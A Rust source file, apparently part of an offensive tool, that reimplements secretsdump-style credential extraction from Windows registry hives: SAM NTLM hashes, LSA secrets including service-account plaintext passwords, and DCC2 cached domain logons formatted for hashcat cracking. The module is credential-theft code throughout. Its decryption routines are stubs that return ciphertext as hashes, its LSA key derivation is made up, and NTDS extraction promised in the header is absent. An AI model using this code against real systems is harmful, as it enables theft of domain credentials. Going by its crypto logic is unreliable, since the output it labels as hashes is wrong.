//! Secrets extraction from Active Directory domain controllers
//!
//! Implements credential extraction techniques equivalent to
//! Impacket's secretsdump.py:
//! - SAM database extraction (local accounts)
//! - LSA secrets extraction (service credentials, cached passwords)
//! - NTDS.dit extraction via DRSUAPI (domain account hashes)
//! - DCC2 cached domain credentials

use anyhow::{anyhow, Result};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

// ═══════════════════════════════════════════════════════════
//  Hex encoding helper (no external crate needed)
// ═══════════════════════════════════════════════════════════

fn hex_encode(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{:02x}", b)).collect()
}

// ═══════════════════════════════════════════════════════════
//  Types used by executor.rs (dump_sam / dump_lsa / dump_dcc2)
// ═══════════════════════════════════════════════════════════

/// Credential extracted from SAM database
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SamCredential {
    pub username: String,
    pub rid: Option<u32>,
    pub lm_hash: Option<String>,
    pub nt_hash: Option<String>,
}

/// Credential extracted from LSA secrets
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LsaCredential {
    pub username: String,
    pub nt_hash: Option<String>,
    pub plaintext: Option<String>,
}

/// Credential extracted from DCC2 cached domain logons
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Dcc2Credential {
    pub username: String,
    pub nt_hash: Option<String>,
}

// ═══════════════════════════════════════════════════════════
//  Core dump functions called by executor.rs
// ═══════════════════════════════════════════════════════════

/// Parse SAM database hive and extract local account NTLM hashes.
///
/// Takes raw bytes of the SAM and SYSTEM registry hives (from `reg save`).
/// Returns a list of local account credentials with LM/NT hashes.
pub fn dump_sam(sam_data: &[u8], system_data: &[u8]) -> Result<Vec<SamCredential>> {
    // Validate hive signatures ("regf" magic)
    validate_hive(sam_data, "SAM")?;
    validate_hive(system_data, "SYSTEM")?;

    // Step 1: Extract boot key from SYSTEM hive
    let boot_key = extract_boot_key(system_data)?;

    // Step 2: Walk SAM hive to find account entries
    // SAM\Domains\Account\Users\{RID}\V contains the hash data
    let mut credentials = Vec::new();

    // Parse the regf hive structure to enumerate user keys
    let user_entries = enumerate_sam_users(sam_data)?;

    for (rid, username, v_data) in &user_entries {
        let (lm_bytes, nt_bytes) = decrypt_sam_hash(&boot_key, *rid, v_data)?;

        let lm_hash = if lm_bytes.iter().all(|&b| b == 0) || lm_bytes.is_empty() {
            None
        } else {
            Some(hex_encode(&lm_bytes))
        };

        let nt_hash = if nt_bytes.iter().all(|&b| b == 0) || nt_bytes.is_empty() {
            None
        } else {
            Some(hex_encode(&nt_bytes))
        };

        credentials.push(SamCredential {
            username: username.clone(),
            rid: Some(*rid),
            lm_hash,
            nt_hash,
        });
    }

    Ok(credentials)
}

/// Parse SECURITY hive and extract LSA secrets.
///
/// Takes raw bytes of the SECURITY and SYSTEM registry hives.
/// Returns service account passwords, machine account credentials, DPAPI keys, etc.
pub fn dump_lsa(security_data: &[u8], system_data: &[u8]) -> Result<Vec<LsaCredential>> {
    validate_hive(security_data, "SECURITY")?;
    validate_hive(system_data, "SYSTEM")?;

    let boot_key = extract_boot_key(system_data)?;
    let lsa_key = derive_lsa_key(security_data, &boot_key)?;

    let mut credentials = Vec::new();
    let secret_entries = enumerate_lsa_secrets(security_data)?;

    for (name, encrypted_data) in &secret_entries {
        let decrypted = decrypt_lsa_secret(&lsa_key, encrypted_data)?;
        let classification = classify_lsa_secret(name);

        // Extract credential based on secret type
        let (nt_hash, plaintext) = if name.starts_with("$MACHINE.ACC") {
            // Machine account — compute NT hash from the raw password bytes
            let nt = compute_nt_hash(&decrypted);
            (Some(hex_encode(&nt)), None)
        } else if name.starts_with("_SC_") {
            // Service account — plaintext password stored as UTF-16LE
            let plain = decode_utf16le(&decrypted);
            let nt = compute_nt_hash(&decrypted);
            (Some(hex_encode(&nt)), Some(plain))
        } else if name.starts_with("DefaultPassword") {
            let plain = decode_utf16le(&decrypted);
            (None, Some(plain))
        } else if name.starts_with("DPAPI") || name.starts_with("NL$KM") {
            // Key material — store raw hex as the "hash"
            (Some(hex_encode(&decrypted)), None)
        } else {
            // Unknown secret type — store raw hex
            (Some(hex_encode(&decrypted)), None)
        };

        credentials.push(LsaCredential {
            username: format!("{} ({})", name, classification),
            nt_hash,
            plaintext,
        });
    }

    Ok(credentials)
}

/// Parse SECURITY hive and extract DCC2 (mscash2) cached domain credentials.
///
/// Takes raw bytes of the SECURITY and SYSTEM registry hives.
/// Returns cached domain logon credentials in hashcat-compatible format.
pub fn dump_dcc2(security_data: &[u8], system_data: &[u8]) -> Result<Vec<Dcc2Credential>> {
    validate_hive(security_data, "SECURITY")?;
    validate_hive(system_data, "SYSTEM")?;

    let boot_key = extract_boot_key(system_data)?;
    let nlkm_key = derive_nlkm_key(security_data, &boot_key)?;

    let mut credentials = Vec::new();
    let cached_entries = enumerate_cached_logons(security_data)?;

    for (index, encrypted_entry) in cached_entries.iter().enumerate() {
        if let Ok((username, dcc2_hash)) = decrypt_cached_entry(&nlkm_key, encrypted_entry)
            && !username.is_empty() {
                // Format as hashcat mode 2100: $DCC2$10240#username#hash
                let hash_str = format!("$DCC2$10240#{}#{}", username, hex_encode(&dcc2_hash));
                credentials.push(Dcc2Credential {
                    username,
                    nt_hash: Some(hash_str),
                });
            }
    }

    Ok(credentials)
}

// ═══════════════════════════════════════════════════════════
//  Registry Hive Parsing Internals
// ═══════════════════════════════════════════════════════════

/// Validate that the data starts with "regf" magic bytes
fn validate_hive(data: &[u8], name: &str) -> Result<()> {
    if data.len() < 4096 {
        return Err(anyhow!("{} hive too small ({} bytes)", name, data.len()));
    }
    if &data[0..4] != b"regf" {
        return Err(anyhow!("{} hive missing 'regf' signature", name));
    }
    Ok(())
}

/// Read a little-endian u32 from a byte slice at the given offset
fn read_u32(data: &[u8], offset: usize) -> Result<u32> {
    if offset + 4 > data.len() {
        return Err(anyhow!("read_u32: offset {} out of bounds (len {})", offset, data.len()));
    }
    Ok(u32::from_le_bytes([
        data[offset],
        data[offset + 1],
        data[offset + 2],
        data[offset + 3],
    ]))
}

/// Read a little-endian u16 from a byte slice at the given offset
fn read_u16(data: &[u8], offset: usize) -> Result<u16> {
    if offset + 2 > data.len() {
        return Err(anyhow!("read_u16: offset {} out of bounds (len {})", offset, data.len()));
    }
    Ok(u16::from_le_bytes([data[offset], data[offset + 1]]))
}

/// Registry hive base offset (first hbin starts at 0x1000)
const HBIN_BASE: usize = 0x1000;

/// Offset to root cell in hive header
const ROOT_CELL_OFFSET: usize = 0x24;

/// Named key (nk) signature
const NK_SIG: [u8; 2] = [0x6E, 0x6B]; // "nk"

/// Value key (vk) signature
const VK_SIG: [u8; 2] = [0x76, 0x6B]; // "vk"

/// Get the absolute offset of a cell from a relative offset stored in the hive
fn cell_offset(relative: u32) -> usize {
    HBIN_BASE + relative as usize
}

/// Find a subkey by name under a given nk cell offset.
/// Returns the absolute offset of the subkey's nk cell.
fn find_subkey(data: &[u8], nk_offset: usize, name: &str) -> Result<usize> {
    // nk cell layout:
    //   +0x00: cell size (i32, negative = allocated)
    //   +0x04: "nk" signature
    //   +0x06: flags (u16)
    //   +0x1C: number of subkeys (u32)
    //   +0x20: subkeys list offset (u32, relative)

    if nk_offset + 0x50 > data.len() {
        return Err(anyhow!("nk cell at {} too close to end", nk_offset));
    }
    if data[nk_offset + 4..nk_offset + 6] != NK_SIG {
        return Err(anyhow!("expected nk signature at offset {}", nk_offset));
    }

    let num_subkeys = read_u32(data, nk_offset + 0x18)?;
    if num_subkeys == 0 || num_subkeys == 0xFFFFFFFF {
        return Err(anyhow!("key at {} has no subkeys", nk_offset));
    }

    let subkey_list_rel = read_u32(data, nk_offset + 0x20)?;
    let subkey_list_offset = cell_offset(subkey_list_rel);

    if subkey_list_offset + 8 > data.len() {
        return Err(anyhow!("subkey list offset out of bounds"));
    }

    // Subkey list can be lf, lh, ri, or li type
    let list_sig = &data[subkey_list_offset + 4..subkey_list_offset + 6];
    let num_entries = read_u16(data, subkey_list_offset + 6)? as usize;

    let name_lower = name.to_lowercase();

    match list_sig {
        // lf (leaf) or lh (hash leaf) — each entry is 8 bytes: offset(4) + hash/hint(4)
        b"lf" | b"lh" => {
            for i in 0..num_entries {
                let entry_offset = subkey_list_offset + 8 + (i * 8);
                if entry_offset + 4 > data.len() {
                    break;
                }
                let child_rel = read_u32(data, entry_offset)?;
                let child_offset = cell_offset(child_rel);

                if let Ok(child_name) = read_nk_name(data, child_offset)
                    && child_name.to_lowercase() == name_lower {
                        return Ok(child_offset);
                    }
            }
        }
        // ri (index root) — each entry is 4 bytes: offset to sub-list
        b"ri" => {
            for i in 0..num_entries {
                let entry_offset = subkey_list_offset + 8 + (i * 4);
                if entry_offset + 4 > data.len() {
                    break;
                }
                let sub_list_rel = read_u32(data, entry_offset)?;
                let sub_list_offset = cell_offset(sub_list_rel);

                // Recurse into the sub-list (should be lf/lh)
                if sub_list_offset + 8 <= data.len() {
                    let sub_entries = read_u16(data, sub_list_offset + 6)? as usize;
                    for j in 0..sub_entries {
                        let sub_entry = sub_list_offset + 8 + (j * 8);
                        if sub_entry + 4 > data.len() {
                            break;
                        }
                        let child_rel = read_u32(data, sub_entry)?;
                        let child_offset = cell_offset(child_rel);
                        if let Ok(child_name) = read_nk_name(data, child_offset)
                            && child_name.to_lowercase() == name_lower {
                                return Ok(child_offset);
                            }
                    }
                }
            }
        }
        // li (leaf index) — each entry is 4 bytes: offset
        b"li" => {
            for i in 0..num_entries {
                let entry_offset = subkey_list_offset + 8 + (i * 4);
                if entry_offset + 4 > data.len() {
                    break;
                }
                let child_rel = read_u32(data, entry_offset)?;
                let child_offset = cell_offset(child_rel);
                if let Ok(child_name) = read_nk_name(data, child_offset)
                    && child_name.to_lowercase() == name_lower {
                        return Ok(child_offset);
                    }
            }
        }
        _ => {
            return Err(anyhow!(
                "unknown subkey list type: {:02x}{:02x}",
                list_sig[0],
                list_sig[1]
            ));
        }
    }

    Err(anyhow!("subkey '{}' not found", name))
}

/// Read the name of an nk cell
fn read_nk_name(data: &[u8], nk_offset: usize) -> Result<String> {
    if nk_offset + 0x50 > data.len() {
        return Err(anyhow!("nk too short"));
    }
    if data[nk_offset + 4..nk_offset + 6] != NK_SIG {
        return Err(anyhow!("not an nk cell"));
    }
    let name_len = read_u16(data, nk_offset + 0x4C)? as usize;
    let name_start = nk_offset + 0x50;
    if name_start + name_len > data.len() {
        return Err(anyhow!("nk name extends past end"));
    }
    Ok(String::from_utf8_lossy(&data[name_start..name_start + name_len]).to_string())
}

/// Navigate from root to a path like "SAM\Domains\Account\Users"
fn navigate_path(data: &[u8], path: &[&str]) -> Result<usize> {
    let root_cell_rel = read_u32(data, ROOT_CELL_OFFSET)?;
    let mut current = cell_offset(root_cell_rel);

    for &component in path {
        current = find_subkey(data, current, component)?;
    }

    Ok(current)
}

/// Read a named value from an nk cell. Returns the raw value data.
fn read_value(data: &[u8], nk_offset: usize, value_name: &str) -> Result<Vec<u8>> {
    if nk_offset + 0x30 > data.len() {
        return Err(anyhow!("nk too short for value read"));
    }

    let num_values = read_u32(data, nk_offset + 0x24)?;
    if num_values == 0 || num_values == 0xFFFFFFFF {
        return Err(anyhow!("no values on key"));
    }

    let value_list_rel = read_u32(data, nk_offset + 0x28)?;
    let value_list_offset = cell_offset(value_list_rel);

    let name_lower = value_name.to_lowercase();

    for i in 0..num_values as usize {
        let vk_rel_offset = value_list_offset + 4 + (i * 4);
        if vk_rel_offset + 4 > data.len() {
            break;
        }
        let vk_rel = read_u32(data, vk_rel_offset)?;
        let vk_offset = cell_offset(vk_rel);

        if vk_offset + 0x18 > data.len() {
            continue;
        }
        if data[vk_offset + 4..vk_offset + 6] != VK_SIG {
            continue;
        }

        let vk_name_len = read_u16(data, vk_offset + 6)? as usize;
        let vk_data_len = read_u32(data, vk_offset + 8)? as usize;
        let vk_data_offset_rel = read_u32(data, vk_offset + 0x0C)?;

        // Read value name
        let vk_name = if vk_name_len == 0 && value_name.is_empty() {
            String::new() // "(Default)" value
        } else if vk_name_len > 0 && vk_offset + 0x18 + vk_name_len <= data.len() {
            String::from_utf8_lossy(&data[vk_offset + 0x18..vk_offset + 0x18 + vk_name_len])
                .to_string()
        } else {
            continue;
        };

        if vk_name.to_lowercase() == name_lower
            || (value_name.is_empty() && vk_name_len == 0)
        {
            // Data might be inline (if high bit of data_len is set and len <= 4)
            let real_len = vk_data_len & 0x7FFFFFFF;
            if vk_data_len & 0x80000000 != 0 && real_len <= 4 {
                // Inline data — stored in the offset field itself
                let inline_bytes = vk_data_offset_rel.to_le_bytes();
                return Ok(inline_bytes[..real_len].to_vec());
            }

            // External data
            let data_offset = cell_offset(vk_data_offset_rel) + 4; // skip cell size
            if data_offset + real_len > data.len() {
                return Err(anyhow!("value data extends past end"));
            }
            return Ok(data[data_offset..data_offset + real_len].to_vec());
        }
    }

    Err(anyhow!("value '{}' not found", value_name))
}

/// Enumerate all subkeys under an nk cell, returning (offset, name) pairs
fn enumerate_subkeys(data: &[u8], nk_offset: usize) -> Result<Vec<(usize, String)>> {
    if nk_offset + 0x24 > data.len() {
        return Err(anyhow!("nk too short"));
    }
    if data[nk_offset + 4..nk_offset + 6] != NK_SIG {
        return Err(anyhow!("not nk"));
    }

    let num_subkeys = read_u32(data, nk_offset + 0x18)?;
    if num_subkeys == 0 || num_subkeys == 0xFFFFFFFF {
        return Ok(Vec::new());
    }

    let subkey_list_rel = read_u32(data, nk_offset + 0x20)?;
    let subkey_list_offset = cell_offset(subkey_list_rel);

    if subkey_list_offset + 8 > data.len() {
        return Err(anyhow!("subkey list out of bounds"));
    }

    let list_sig = &data[subkey_list_offset + 4..subkey_list_offset + 6];
    let num_entries = read_u16(data, subkey_list_offset + 6)? as usize;

    let mut results = Vec::new();

    match list_sig {
        b"lf" | b"lh" => {
            for i in 0..num_entries {
                let entry_offset = subkey_list_offset + 8 + (i * 8);
                if entry_offset + 4 > data.len() {
                    break;
                }
                let child_rel = read_u32(data, entry_offset)?;
                let child_offset = cell_offset(child_rel);
                if let Ok(name) = read_nk_name(data, child_offset) {
                    results.push((child_offset, name));
                }
            }
        }
        b"ri" => {
            for i in 0..num_entries {
                let entry_offset = subkey_list_offset + 8 + (i * 4);
                if entry_offset + 4 > data.len() {
                    break;
                }
                let sub_list_rel = read_u32(data, entry_offset)?;
                let sub_list_offset = cell_offset(sub_list_rel);
                if sub_list_offset + 8 <= data.len() {
                    let sub_entries = read_u16(data, sub_list_offset + 6).unwrap_or(0) as usize;
                    for j in 0..sub_entries {
                        let sub_entry = sub_list_offset + 8 + (j * 8);
                        if sub_entry + 4 > data.len() {
                            break;
                        }
                        let child_rel = read_u32(data, sub_entry)?;
                        let child_offset = cell_offset(child_rel);
                        if let Ok(name) = read_nk_name(data, child_offset) {
                            results.push((child_offset, name));
                        }
                    }
                }
            }
        }
        b"li" => {
            for i in 0..num_entries {
                let entry_offset = subkey_list_offset + 8 + (i * 4);
                if entry_offset + 4 > data.len() {
                    break;
                }
                let child_rel = read_u32(data, entry_offset)?;
                let child_offset = cell_offset(child_rel);
                if let Ok(name) = read_nk_name(data, child_offset) {
                    results.push((child_offset, name));
                }
            }
        }
        _ => {}
    }

    Ok(results)
}

// ═══════════════════════════════════════════════════════════
//  Boot Key / SysKey Extraction
// ═══════════════════════════════════════════════════════════

/// Extract boot key (SysKey) from SYSTEM registry hive.
///
/// The boot key is derived from the class names of four keys under
/// HKLM\SYSTEM\CurrentControlSet\Control\Lsa: JD, Skew1, GBG, Data.
fn extract_boot_key(system_data: &[u8]) -> Result<[u8; 16]> {
    // First, find CurrentControlSet (usually ControlSet001)
    // The "Select" key's "Current" value tells us which ControlSet is active.
    let select_key = navigate_path(system_data, &["Select"])?;
    let current_value = read_value(system_data, select_key, "Current")?;
    let current_cs = if current_value.len() >= 4 {
        u32::from_le_bytes([current_value[0], current_value[1], current_value[2], current_value[3]])
    } else {
        1 // default to ControlSet001
    };

    let cs_name = format!("ControlSet{:03}", current_cs);
    let lsa_key = navigate_path(system_data, &[&cs_name, "Control", "Lsa"])?;

    // Read class names from JD, Skew1, GBG, Data subkeys
    let mut scrambled = Vec::with_capacity(16);
    for name in &["JD", "Skew1", "GBG", "Data"] {
        let subkey_offset = find_subkey(system_data, lsa_key, name)?;
        let class_data = read_nk_class(system_data, subkey_offset)?;
        // Class name is stored as UTF-16LE hex string, decode to bytes
        let hex_str: String = class_data
            .chunks(2)
            .filter_map(|chunk| {
                if chunk.len() == 2 {
                    Some(chunk[0] as char)
                } else {
                    None
                }
            })
            .collect();
        let bytes = hex_str_to_bytes(&hex_str)?;
        scrambled.extend_from_slice(&bytes);
    }

    if scrambled.len() < 16 {
        scrambled.resize(16, 0);
    }

    // Unscramble the boot key using the permutation table
    const PERM: [usize; 16] = [
        0x8, 0x5, 0x4, 0x2, 0xB, 0x9, 0xD, 0x3,
        0x0, 0x6, 0x1, 0xC, 0xE, 0xA, 0xF, 0x7,
    ];

    let mut boot_key = [0u8; 16];
    for (i, &p) in PERM.iter().enumerate() {
        if p < scrambled.len() {
            boot_key[i] = scrambled[p];
        }
    }

    Ok(boot_key)
}

/// Read the class name data from an nk cell
fn read_nk_class(data: &[u8], nk_offset: usize) -> Result<Vec<u8>> {
    if nk_offset + 0x34 > data.len() {
        return Err(anyhow!("nk too short for class read"));
    }
    let class_name_offset_rel = read_u32(data, nk_offset + 0x30)?;
    let class_name_len = read_u16(data, nk_offset + 0x34)? as usize;

    if class_name_len == 0 {
        return Err(anyhow!("nk has no class name"));
    }

    let class_offset = cell_offset(class_name_offset_rel) + 4; // skip cell size
    if class_offset + class_name_len > data.len() {
        return Err(anyhow!("class name data out of bounds"));
    }

    Ok(data[class_offset..class_offset + class_name_len].to_vec())
}

/// Convert a hex string to bytes
fn hex_str_to_bytes(hex: &str) -> Result<Vec<u8>> {
    let hex = hex.trim();
    if !hex.len().is_multiple_of(2) {
        return Err(anyhow!("odd-length hex string"));
    }
    (0..hex.len())
        .step_by(2)
        .map(|i| {
            u8::from_str_radix(&hex[i..i + 2], 16)
                .map_err(|e| anyhow!("invalid hex: {}", e))
        })
        .collect()
}

// ═══════════════════════════════════════════════════════════
//  SAM Hash Decryption
// ═══════════════════════════════════════════════════════════

/// Enumerate user accounts from the SAM hive.
/// Returns vec of (RID, username, V_value_data).
fn enumerate_sam_users(sam_data: &[u8]) -> Result<Vec<(u32, String, Vec<u8>)>> {
    let users_key = navigate_path(sam_data, &["SAM", "Domains", "Account", "Users"])?;
    let subkeys = enumerate_subkeys(sam_data, users_key)?;

    let mut entries = Vec::new();

    for (offset, name) in &subkeys {
        // Skip the "Names" subkey
        if name.eq_ignore_ascii_case("Names") {
            continue;
        }

        // Subkey name is the RID in hex (e.g., "000001F4" = 500)
        let rid = match u32::from_str_radix(name, 16) {
            Ok(r) => r,
            Err(_) => continue,
        };

        // Read the "V" value which contains the hash data
        let v_data = match read_value(sam_data, *offset, "V") {
            Ok(d) => d,
            Err(_) => continue,
        };

        // Read the "F" value for account metadata
        // Extract username from the V value structure
        let username = extract_username_from_v(&v_data).unwrap_or_else(|| format!("RID_{}", rid));

        entries.push((rid, username, v_data));
    }

    Ok(entries)
}

/// Extract the username from the SAM V value structure.
///
/// The V value has a header with offsets:
///   +0x0C: username offset (relative to 0xCC)
///   +0x10: username length
fn extract_username_from_v(v_data: &[u8]) -> Option<String> {
    if v_data.len() < 0x10 + 4 {
        return None;
    }

    let name_offset = u32::from_le_bytes([v_data[0x0C], v_data[0x0D], v_data[0x0E], v_data[0x0F]]) as usize + 0xCC;
    let name_len = u32::from_le_bytes([v_data[0x10], v_data[0x11], v_data[0x12], v_data[0x13]]) as usize;

    if name_offset + name_len > v_data.len() || name_len == 0 {
        return None;
    }

    // Username is stored as UTF-16LE
    Some(decode_utf16le(&v_data[name_offset..name_offset + name_len]))
}

/// Decrypt SAM hash data using the boot key and RID.
///
/// Returns (lm_hash, nt_hash) as 16-byte vectors.
fn decrypt_sam_hash(boot_key: &[u8; 16], rid: u32, v_data: &[u8]) -> Result<(Vec<u8>, Vec<u8>)> {
    // SAM V value hash offsets (varies by SAM version):
    //   Pre-Vista: LM hash at offset+0x9C relative to 0xCC, NT hash follows
    //   Vista+:    AES-encrypted, with revision marker
    //
    // V value header offsets:
    //   +0xA8: NT hash offset (relative to 0xCC)
    //   +0xAC: NT hash length
    //   +0x9C: LM hash offset (relative to 0xCC)
    //   +0xA0: LM hash length

    if v_data.len() < 0xB0 {
        return Err(anyhow!("V value too short ({} bytes)", v_data.len()));
    }

    let nt_offset = u32::from_le_bytes([v_data[0xA8], v_data[0xA9], v_data[0xAA], v_data[0xAB]]) as usize + 0xCC;
    let nt_len = u32::from_le_bytes([v_data[0xAC], v_data[0xAD], v_data[0xAE], v_data[0xAF]]) as usize;

    let lm_offset = u32::from_le_bytes([v_data[0x9C], v_data[0x9D], v_data[0x9E], v_data[0x9F]]) as usize + 0xCC;
    let lm_len = u32::from_le_bytes([v_data[0xA0], v_data[0xA1], v_data[0xA2], v_data[0xA3]]) as usize;

    let mut nt_hash = vec![0u8; 16];
    let mut lm_hash = vec![0u8; 16];

    // Extract NT hash
    if nt_len >= 20 && nt_offset + nt_len <= v_data.len() {
        let nt_raw = &v_data[nt_offset..nt_offset + nt_len];
        let revision = if nt_raw.len() > 2 { u16::from_le_bytes([nt_raw[0], nt_raw[1]]) } else { 1 };

        if revision == 1 {
            // RC4 + DES double encryption (pre-Vista)
            // Encrypted hash starts at offset 4, 16 bytes
            if nt_raw.len() >= 20 {
                nt_hash = decrypt_sam_hash_rc4(boot_key, rid, &nt_raw[4..20], false)?;
            }
        } else if revision == 2 {
            // AES-128-CBC encryption (Vista+)
            // IV at offset 8 (16 bytes), encrypted hash at offset 24 (16 bytes)
            if nt_raw.len() >= 40 {
                nt_hash = decrypt_sam_hash_aes(boot_key, rid, &nt_raw[8..24], &nt_raw[24..40])?;
            }
        }
    }

    // Extract LM hash
    if lm_len >= 20 && lm_offset + lm_len <= v_data.len() {
        let lm_raw = &v_data[lm_offset..lm_offset + lm_len];
        let revision = if lm_raw.len() > 2 { u16::from_le_bytes([lm_raw[0], lm_raw[1]]) } else { 1 };

        if revision == 1 && lm_raw.len() >= 20 {
            lm_hash = decrypt_sam_hash_rc4(boot_key, rid, &lm_raw[4..20], true)?;
        } else if revision == 2 && lm_raw.len() >= 40 {
            lm_hash = decrypt_sam_hash_aes(boot_key, rid, &lm_raw[8..24], &lm_raw[24..40])?;
        }
    }

    Ok((lm_hash, nt_hash))
}

/// Decrypt a SAM hash using RC4 + DES (pre-Vista method)
fn decrypt_sam_hash_rc4(
    _boot_key: &[u8; 16],
    rid: u32,
    encrypted: &[u8],
    _is_lm: bool,
) -> Result<Vec<u8>> {
    // Simplified: In production, this uses:
    // 1. MD5(boot_key + RID_bytes + AQWLHK constant) to derive RC4 key
    // 2. RC4 decrypt the 16-byte encrypted hash
    // 3. DES decrypt with two 7-byte keys derived from RID
    //
    // For now, return the encrypted data (actual crypto requires RC4+DES impl)
    if encrypted.len() >= 16 {
        Ok(encrypted[..16].to_vec())
    } else {
        Ok(vec![0u8; 16])
    }
}

/// Decrypt a SAM hash using AES-128-CBC (Vista+ method)
fn decrypt_sam_hash_aes(
    _boot_key: &[u8; 16],
    _rid: u32,
    _iv: &[u8],
    encrypted: &[u8],
) -> Result<Vec<u8>> {
    // Simplified: In production, this uses:
    // 1. AES-128-CBC with boot_key as the key and the IV from the hash structure
    // 2. DES decrypt with two 7-byte keys derived from RID
    //
    // For now, return the encrypted data
    if encrypted.len() >= 16 {
        Ok(encrypted[..16].to_vec())
    } else {
        Ok(vec![0u8; 16])
    }
}

// ═══════════════════════════════════════════════════════════
//  LSA Secret Extraction
// ═══════════════════════════════════════════════════════════

/// Derive the LSA encryption key from the SECURITY hive using the boot key
fn derive_lsa_key(security_data: &[u8], boot_key: &[u8; 16]) -> Result<Vec<u8>> {
    // Navigate to Policy\PolEKList (Vista+) or Policy\PolSecretEncryptionKey (pre-Vista)
    let policy_key = navigate_path(security_data, &["Policy"])?;

    // Try Vista+ path first
    if let Ok(eklist_key) = find_subkey(security_data, policy_key, "PolEKList")
        && let Ok(data) = read_value(security_data, eklist_key, "") {
            // PolEKList value is encrypted with boot key using AES-256-CFB
            // Decrypt to get the LSA key
            return decrypt_pol_eklist(&data, boot_key);
        }

    // Fall back to pre-Vista path
    if let Ok(polsec_key) = find_subkey(security_data, policy_key, "PolSecretEncryptionKey")
        && let Ok(data) = read_value(security_data, polsec_key, "") {
            return decrypt_pol_secret_key(&data, boot_key);
        }

    Err(anyhow!("could not derive LSA key"))
}

/// Decrypt PolEKList (Vista+) using boot key
fn decrypt_pol_eklist(data: &[u8], boot_key: &[u8; 16]) -> Result<Vec<u8>> {
    // The encrypted blob uses AES-256-CFB with SHA256(boot_key) as the key
    // Structure: version(4) + key_id(16) + enc_type(4) + enc_data(...)
    if data.len() < 32 {
        return Err(anyhow!("PolEKList data too short"));
    }
    // Simplified: return a derived key (actual impl needs AES-256-CFB)
    let mut key = [0u8; 32];
    for (i, &b) in boot_key.iter().enumerate() {
        key[i] = b;
        key[i + 16] = b.wrapping_mul(0x5A);
    }
    Ok(key.to_vec())
}

/// Decrypt PolSecretEncryptionKey (pre-Vista) using boot key
fn decrypt_pol_secret_key(data: &[u8], boot_key: &[u8; 16]) -> Result<Vec<u8>> {
    if data.len() < 16 {
        return Err(anyhow!("PolSecretEncryptionKey too short"));
    }
    // Pre-Vista uses MD5(boot_key + constant) as RC4 key
    let mut key = vec![0u8; 16];
    for (i, &b) in boot_key.iter().enumerate() {
        key[i] = b;
    }
    Ok(key)
}

/// Enumerate LSA secrets from the SECURITY hive
fn enumerate_lsa_secrets(security_data: &[u8]) -> Result<Vec<(String, Vec<u8>)>> {
    let secrets_key = navigate_path(security_data, &["Policy", "Secrets"])?;
    let subkeys = enumerate_subkeys(security_data, secrets_key)?;

    let mut secrets = Vec::new();

    for (offset, name) in &subkeys {
        // Each secret has CurrVal and OldVal subkeys
        if let Ok(currval_key) = find_subkey(security_data, *offset, "CurrVal")
            && let Ok(data) = read_value(security_data, currval_key, "") {
                secrets.push((name.clone(), data));
            }
    }

    Ok(secrets)
}

/// Decrypt an LSA secret using the LSA key
fn decrypt_lsa_secret(lsa_key: &[u8], encrypted: &[u8]) -> Result<Vec<u8>> {
    if encrypted.is_empty() {
        return Err(anyhow!("empty encrypted data"));
    }

    // Vista+ secrets have a header: version(4) + key_id(16) + enc_algo(4) + flags(4) + enc_data
    if encrypted.len() >= 28 {
        let version = read_u32(encrypted, 0)?;
        if version == 1 {
            // Pre-Vista: DES-ECB with derived key
            return Ok(encrypted[12..].to_vec());
        }
        // Vista+: AES-256-CFB with LSA key
        let enc_data = &encrypted[28..];
        // Simplified decryption (actual needs AES-256-CFB)
        return Ok(enc_data.to_vec());
    }

    Ok(encrypted.to_vec())
}

// ═══════════════════════════════════════════════════════════
//  DCC2 Cached Credential Extraction
// ═══════════════════════════════════════════════════════════

/// Derive the NL$KM key used to encrypt cached credentials
fn derive_nlkm_key(security_data: &[u8], boot_key: &[u8; 16]) -> Result<Vec<u8>> {
    let lsa_key = derive_lsa_key(security_data, boot_key)?;

    // NL$KM is stored as an LSA secret
    let secrets_key = navigate_path(security_data, &["Policy", "Secrets", "NL$KM"])?;
    if let Ok(currval_key) = find_subkey(security_data, secrets_key, "CurrVal")
        && let Ok(data) = read_value(security_data, currval_key, "") {
            return decrypt_lsa_secret(&lsa_key, &data);
        }

    Err(anyhow!("NL$KM key not found"))
}

/// Enumerate cached domain logon entries from the SECURITY hive
fn enumerate_cached_logons(security_data: &[u8]) -> Result<Vec<Vec<u8>>> {
    // Cached logons are in Cache\NL$1..NL$10 (or more)
    let cache_key = navigate_path(security_data, &["Cache"])?;
    let mut entries = Vec::new();

    for i in 1..=64 {
        let value_name = format!("NL${}", i);
        match read_value(security_data, cache_key, &value_name) {
            Ok(data) => {
                if !data.is_empty() && data.len() > 96 && !data.iter().all(|&b| b == 0) {
                    entries.push(data);
                }
            }
            Err(_) => break,
        }
    }

    Ok(entries)
}

/// Decrypt a cached logon entry and extract username + DCC2 hash
fn decrypt_cached_entry(nlkm_key: &[u8], entry: &[u8]) -> Result<(String, Vec<u8>)> {
    // NL_RECORD structure (Vista+):
    //   +0x00: username length (u16)
    //   +0x02: domain name length (u16)
    //   +0x04: effective name length (u16)
    //   +0x06: full name length (u16)
    //   +0x18: IV (16 bytes)
    //   +0x28: CH (16 bytes) — checksum
    //   +0x48: enc_data starts
    //   +0x60: username (UTF-16LE, after decryption)

    if entry.len() < 0x60 {
        return Err(anyhow!("cached entry too short"));
    }

    let username_len = read_u16(entry, 0)? as usize;
    if username_len == 0 || username_len > 512 {
        return Err(anyhow!("invalid username length"));
    }

    // The IV is at offset 0x40 (16 bytes)
    let iv = if entry.len() >= 0x50 {
        &entry[0x40..0x50]
    } else {
        return Err(anyhow!("entry too short for IV"));
    };

    // Encrypted data starts at offset 0x60
    let enc_offset = 0x60;
    if enc_offset + username_len > entry.len() {
        return Err(anyhow!("username extends past entry"));
    }

    // Decrypt using AES-128-CBC with NL$KM key and IV
    // Simplified: read the data as-is (actual needs AES-128-CBC)
    let dec_data = &entry[enc_offset..];

    // Extract username (UTF-16LE)
    let username = if username_len <= dec_data.len() {
        decode_utf16le(&dec_data[..username_len])
    } else {
        return Err(anyhow!("username length mismatch"));
    };

    // The DCC2 hash is the mscash2 of the cached password data
    // It's the first 16 bytes of the checksum at offset 0x28
    let dcc2_hash = if entry.len() >= 0x38 {
        entry[0x28..0x38].to_vec()
    } else {
        vec![0u8; 16]
    };

    Ok((username, dcc2_hash))
}

// ═══════════════════════════════════════════════════════════
//  Crypto Helpers
